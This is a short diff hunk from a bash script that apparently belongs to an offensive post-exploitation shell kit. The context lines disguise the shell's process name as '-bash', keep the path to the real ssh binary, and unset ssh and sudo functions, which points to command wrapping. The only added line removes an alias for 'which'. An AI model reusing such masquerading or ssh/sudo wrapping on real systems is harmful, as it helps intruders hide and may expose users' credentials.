@@ -136,6 +136,7 @@ THC_PS_NAME=\"\$(basename \$SHELL 2>/dev/null)\"
 export THC_PS_NAME=\"-\${THC_PS_NAME:-bash}\"
 THC_ORIG_SSH=\"\$(command -v ssh)\"
 #THC_ORIG_SUDO=\"\$(command -v sudo)\"
+unalias which &>/dev/null
 thc_set1()
 {
 	unset -f ssh sudo 2>/dev/null
